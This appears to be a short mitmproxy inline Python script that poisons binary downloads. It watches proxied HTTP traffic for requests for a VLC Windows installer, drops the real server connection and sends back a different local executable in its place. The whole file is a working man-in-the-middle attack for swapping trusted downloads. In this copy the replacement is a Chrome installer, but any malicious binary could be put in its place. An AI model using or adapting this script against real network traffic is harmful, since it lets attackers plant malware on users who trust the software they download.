from libmproxy.protocol.http import decoded, HTTPResponse
from netlib.odict import ODictCaseless
from mimetypes import guess_type

# TODO: Make those arguments
FILENAME_TO_POISON = "vlc-2.1.5-win32.exe"
PATH_TO_BAD_FILE = "/Users/gtklocker/Downloads/ChromeStandaloneSetup.exe"

def request(context, flow):
    if flow.request.path.endswith(FILENAME_TO_POISON):
        context.log("Poisoning the requested file")
        context.log(flow.request.path)
        context.log("Closing server connection")
        flow.server_conn.close()

        # TODO: Don't read the whole file in memory-maybe use a web server that already solves this
        with open(PATH_TO_BAD_FILE, "rb") as f:
            resp = HTTPResponse(
                [1, 1], 200, "OK",
                ODictCaseless([["Content-Type", guess_type(PATH_TO_BAD_FILE)[0]]]),
                f.read())
        flow.reply(resp)
